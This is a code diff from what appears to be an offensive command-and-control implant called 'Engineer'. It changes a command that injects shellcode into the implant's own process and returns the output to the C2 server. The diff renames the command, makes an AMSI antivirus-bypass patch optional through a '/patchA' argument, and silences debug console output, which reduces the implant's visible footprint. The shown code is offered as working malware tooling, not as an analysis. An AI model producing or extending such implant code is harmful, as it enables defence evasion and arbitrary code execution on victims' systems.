@@ -23,7 +23,7 @@ namespace Engineer.Commands
     // goal was to allow self injection of shellcode and return the output to the C2 but nothing I do will redirect the shellcodes output away from the console. 
     internal class ShellcodeSelf : EngineerCommand
     {
-        public override string Name => "shellcode";
+        public override string Name => "InlineShellcode";
         public string output;
         public static MemoryStream Ms = new MemoryStream();
         public static StreamWriter writer = new StreamWriter(Ms);
@@ -77,16 +77,22 @@ namespace Engineer.Commands
             //check if the console out and console error got updated
             if (!setHadnleSuccess)
             {
-                Console.WriteLine("Failed to redirect output");
+                //Console.WriteLine("Failed to redirect output");
                 Tasking.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
 
             try
             {
-                Console.WriteLine("[+] Patching amsi");
-                Patch_AMSI patchobject = new Patch_AMSI();
-                patchobject.Execute(null);
+                //Console.WriteLine("[+] Patching amsi");
+                task.Arguments.TryGetValue("/patchA", out string patch);
+                bool.TryParse(patch,out bool isPatching);
+                if (isPatching)
+                {
+                    Tasking.FillTaskResults("patching", task, EngTaskStatus.Running, TaskResponseType.String);
+                    Patch_AMSI patchobject = new Patch_AMSI();
+                    patchobject.Execute(null);
+                }
 
                 //use reprobate to call virtualalloc
                 var hMemory = IntPtr.Zero;
@@ -101,14 +107,14 @@ namespace Engineer.Commands
                 byte[] buffer = new byte[65535];
                 
                 uint bytesRead = 0;
-                Console.WriteLine("reading from pipe");
+               // Console.WriteLine("reading from pipe");
                 var success = WinAPIs.Kernel32.ReadFile(pipeHandle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
-                Console.WriteLine($"read {bytesRead} bytes");
+                //Console.WriteLine($"read {bytesRead} bytes");
                 output = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+               // Console.WriteLine(e.Message);
             }
             finally
             {
